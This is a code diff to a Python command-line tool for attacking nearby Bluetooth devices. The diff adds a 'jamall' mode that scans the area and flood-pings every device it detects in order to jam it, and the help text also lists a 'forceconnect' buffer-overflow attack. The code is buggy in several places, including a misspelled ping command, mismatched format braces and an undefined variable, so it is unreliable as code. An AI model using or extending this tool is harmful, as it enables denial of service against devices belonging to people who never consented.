@@ -52,7 +52,7 @@ def force_connect(target):
             subprocess.call(connect)
             bar()
 
-def passive_prevent(target) -> None:
+def passive_prevent(target):
     if item not in blocked_addr:
         subprocess.check_output("sudo 12ping -i {interface} -s {packetsize} -f {target}}".split(" "))
 
@@ -65,13 +65,11 @@ def passive_scan():
         if packetsize == " ":
             print("Packet size not set")
             main()
-        if target == " ":
-            print("target not set")
-            main()
+        
 
         os.system("clear")
 
-        threads: list[Thread] = []
+        theads = []
 
 
         while True:       
@@ -82,14 +80,18 @@ def passive_scan():
             for name, addr in nearby_devices:
                 print("Blocked devices:")
                 print (" > %s - %s" % (addr, name))
-                threads.append(Thread(target=passive_prevent, args=(addr)))  # Not sure how you want this to work, but you might want to call a .join() on all the threads to wait until they're all done.
-                threads[-1].start()
+                t = Thread(target=passive_prevent, args=(addr)) 
+                t.start()
+                t.join()
                 blocked_addr.append(addr)
+                
 
             print(" \n")
             print(" ")
 
-            os.system("clear")
+            
+
+        
     except OSError as error:
         print(error)
         print("Make sure your bluetooth adapter is up and connected")
@@ -115,13 +117,14 @@ def help_menu():
     print(" \n")
     print("Commands")
     print("--------------------------")
-    print("scan  ---  scans for bluetooth devices in the area")
-    print("jam  ---  jams devices using specified interface, target, and packet size")
-    print("forceconnect  ---  tries to cause a buffer overflow connection on vulnerable devices")
-    print("set target <target>  --- sets target MAC address for later use")
-    print("set interface <interface> ---  sets bluetooth interface for use")
+    print("scan                         ---  scans for bluetooth devices in the area")
+    print("jam                          ---  jams devices using specified interface, target, and packet size")
+    print("forceconnect                 ---  tries to cause a buffer overflow connection on vulnerable devices")
+    print("set target <target>          ---  sets target MAC address for later use")
+    print("set interface <interface>    ---  sets bluetooth interface for use")
     print("set packetsize <packet size> ---  sets packet size for use with the \"jam\" command (in bytes)")
-    print("clear  ---  clears terminal window")
+    print("clear                        ---  clears terminal window")
+    print("jamall                       ---  jam all devices as soon as detecting")
     print(" ")
 
 
@@ -170,6 +173,9 @@ def main():
 
         if cmd == "forceconnect":
             force_connect(target)
+
+        if cmd == "jamall":
+            passive_scan()
 
         if cmd == "help":
             help_menu()
